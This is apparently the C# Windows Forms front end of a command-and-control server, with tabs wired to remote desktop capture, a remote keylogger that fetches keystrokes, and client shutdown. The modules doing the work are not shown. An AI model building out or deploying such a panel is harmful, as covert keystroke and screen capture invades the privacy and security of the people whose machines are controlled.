
using System;

using System.Windows.Forms;


namespace CommandControlServer
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
                    
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            RemoteDesktop.initRemoteDesktop(textBox3, pictureBox1, toolStripStatusLabel1);
            RemoteKeylogger.initRemoteKeylogger(textBox4, button9, button10);
            Basic.initBasic(this, toolStripStatusLabel1, textBox1, textBox2);
            Basic.startThreads();
        }

        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            Basic.tb2_keydown(e);
        }

        //Tab1 messagebox
        private void button1_Click(object sender, EventArgs e)
        {
            Basic.btn1_click();
        }

        //Tab 1 beep
        private void button2_Click(object sender, EventArgs e)
        {
            Basic.btn2_click();
        }

        //Tab1 playsound
        private void button3_Click(object sender, EventArgs e)
        {
            Basic.btn3_click();
        }

        //Tab 1 shutdown client
        private void button4_Click(object sender, EventArgs e)
        {
            Basic.btn4_click();
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Basic.frm_closing();
        }

        //-- Tab2 Hello
        private void button5_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn5_click();
        }

        //-- Tab2 Bye
        private void button6_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn6_click();
        }

        //-- Tab2 Picture 
        private void button7_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn7_click();
        }

        //-- Tab2 Stop Client
        private void button8_Click(object sender, EventArgs e)
        {
            RemoteDesktop.btn8_click();
        }

        //-- Tab3 Get Keystrokes
        private void button9_Click(object sender, EventArgs e)
        {
            RemoteKeylogger.btn9_click();
        }

        //-- Tab3 Stop Client
        private void button10_Click(object sender, EventArgs e)
        {
            RemoteKeylogger.btn10_click();
        }
    }
}
